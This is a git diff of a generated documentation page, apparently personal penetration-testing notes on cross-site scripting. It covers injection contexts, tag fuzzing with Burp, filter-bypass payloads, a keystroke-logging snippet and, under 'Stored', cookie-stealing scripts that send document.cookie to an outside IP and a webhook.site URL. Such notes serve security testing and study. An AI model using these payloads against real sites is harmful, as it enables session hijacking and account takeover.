+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Weak%20Service%20Permissions/" class="md-nav__link">
         
   
   
@@ -4298,7 +4366,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/" class="md-nav__link">
         
   
   
@@ -4321,7 +4389,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%F0%9F%91%BB%20PrintNightmare/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%F0%9F%91%BB%20PrintNightmare/" class="md-nav__link">
         
   
   
@@ -4377,6 +4445,57 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#htlm-tag-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTLM Tag Context
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#javascript-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      Javascript context
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general" class="md-nav__link">
+    <span class="md-ellipsis">
+      General
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="General">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#quickly-test-for-unfiltered-tags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quickly test for unfiltered tags
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#dom-xss" class="md-nav__link">
     <span class="md-ellipsis">
       DOM XSS
@@ -4387,7 +4506,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#identify" class="md-nav__link">
+  <a href="#identify_1" class="md-nav__link">
     <span class="md-ellipsis">
       Identify
     </span>
@@ -4406,6 +4525,21 @@
       Stored
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Stored">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#automated-with-dom-invader" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automated with DOM Invader
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -4430,53 +4564,98 @@
 
   <h1>Cross Site Scripting (XSS)</h1>
 
+<p><a href="https://appsecexplained.gitbook.io/appsecexplained/common-vulns/javascript-injection-xss/xss-methodology">https://appsecexplained.gitbook.io/appsecexplained/common-vulns/javascript-injection-xss/xss-methodology</a></p>
+<h2 id="identify">Identify</h2>
+<hr />
+<p>Are we able to control any data that is being reflected back and rendered by the application?</p>
+<p>Important considerations:
+- Where is the payload executing?
+- What input validation exists?</p>
+<h2 id="htlm-tag-context">HTLM Tag Context</h2>
+<hr />
+<p>If we have control over content that is being reflected in an html tag.
+You can try to close the tag and exec
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&quot;&gt;&lt;img src=x onerror=&quot;prompt(1)&quot;&gt;
+</span></code></pre></div>
+If you have control over an <code>href</code> you can try the javascript browser scheme
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>http://example.com --&gt; javascript:prompt()
+</span></code></pre></div></p>
+<h2 id="javascript-context">Javascript context</h2>
+<hr />
+<p>If we have control over content that is being reflected into a javascript context. Example:
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">querySearch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;controlledInput&#39;</span>
+</span></code></pre></div>
+Break the quote by appending input and comment out trailing semicolon.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>controlledInput&#39;;prompt()//&#39;;
+</span></code></pre></div></p>
+<h2 id="general">General</h2>
+<h3 id="quickly-test-for-unfiltered-tags">Quickly test for unfiltered tags</h3>
+<hr />
+<ol>
+<li>Get a list of tags (copy to clipboard <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a>)</li>
+<li>Intercept request with burp, send to intruder.
+<img alt="" src="../../../assets/Pasted%20image%2020250629173700.png" /></li>
+<li>Paste the tags into the payloads. </li>
+<li>Start attack, monitor for unfiltered response codes, different length responses, etc...</li>
+<li>You've hopefully found an unfiltered tag.</li>
+<li>You can append portions of the payloads to determine exactly what is triggering the block.</li>
+<li>Copy the events from portswigger, do the same thing for the event portion of the payload.</li>
+</ol>
 <p><strong>Test html injection first, usually this is a good indicator (JS = you might need to bypass filter)</strong>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">test</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">test</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
 </span></code></pre></div>
 <strong>Payloads</strong>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">print</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">print</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">prompt</span><span class="p">(</span><span class="s2">&quot;string&quot;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">prompt</span><span class="p">(</span><span class="s2">&quot;string&quot;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a> <span class="p">&lt;</span><span class="nt">plaintext</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a> <span class="p">&lt;</span><span class="nt">plaintext</span><span class="p">&gt;</span>
 </span></code></pre></div></p>
 <div class="admonition alert">
 <p class="admonition-title">info</p>
 <p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on</p>
 </div>
 <p><strong>You need to trigger XSS if not executed on page load</strong>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;prompt(1)&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;prompt(1)&quot;</span><span class="p">&gt;</span>
 </span></code></pre></div>
 <strong>Redirect</strong>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;window.location.href=&#39;&lt;https://example.com&gt;&#39;&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;window.location.href=&#39;&lt;https://example.com&gt;&#39;&quot;</span><span class="p">&gt;</span>
 </span></code></pre></div>
 <strong>script tag filter</strong>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">print()</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">print()</span><span class="p">&gt;</span>
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">&lt;</span><span class="nt">scri</span><span class="err">&lt;</span><span class="na">script</span><span class="p">&gt;</span>pt&gt;prompt(1)<span class="p">&lt;</span><span class="nt">scri</span><span class="err">&lt;/</span><span class="na">scr</span><span class="err">&lt;/</span><span class="na">script</span><span class="p">&gt;</span>ipt&gt;
+<div class="language-html highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">scri</span><span class="err">&lt;</span><span class="na">script</span><span class="p">&gt;</span>pt&gt;prompt(1)<span class="p">&lt;</span><span class="nt">scri</span><span class="err">&lt;/</span><span class="na">scr</span><span class="err">&lt;/</span><span class="na">script</span><span class="p">&gt;</span>ipt&gt;
 </span></code></pre></div>
 <strong>Keylogger</strong>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>function logKey(event){console.log(event.key)}
+<div class="language-html highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>function logKey(event){console.log(event.key)}
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a> document.addEventListener(&#39;keydown&#39;, logKey)
+<div class="language-html highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a> document.addEventListener(&#39;keydown&#39;, logKey)
 </span></code></pre></div></p>
 <h2 id="dom-xss">DOM XSS</h2>
 <hr />
-<h3 id="identify">Identify</h3>
+<h3 id="identify_1">Identify</h3>
 <p>You have XSS execution, but no http requests are being made. We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end. This is DOM XSS
 if we look at the page source by hitting <code>CTRL+U</code>, we will notice that our <code>test</code> string is nowhere to be found. This is because the JavaScript code is updating the page when we click the <code>Add</code> button
 We can still view the rendered page source with the Web Inspector tool by clicking <code>CTRL+SHIFT+C</code>:</p>
-<p><img alt="" src="../../assets/Pasted%20image%2020250605075243.png" /></p>
 <h2 id="stored">Stored</h2>
 <p><strong>Steal admin cookie (classic)</strong>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;&lt;http://192.168.187.130:9999/&gt;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;&lt;http://192.168.187.130:9999/&gt;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?&quot;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?&quot;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div></p>
+<div class="admonition alert">
+<p class="admonition-title">note</p>
+<p>Sometimes you may need to trigger the payload with JS as well (JS to resize the screen when using an onresize event to trigger)</p>
+</div>
+<h3 id="automated-with-dom-invader">Automated with DOM Invader</h3>
+<hr />
+<p>Turn DOM invader on via the burp extension. Open dev tools,click DOM Invader tab.
+Input the provided canary to potential execution. DOM Invader will identify sources and sinks for that data.</p>
 
 
 
@@ -4528,10 +4707,10 @@ We can still view the rendered page source with the Web Inspector tool by clicki
     
     
       
-      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "navigation.tabs"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.13a4f30d.min.js"></script>
       
     
   </body>
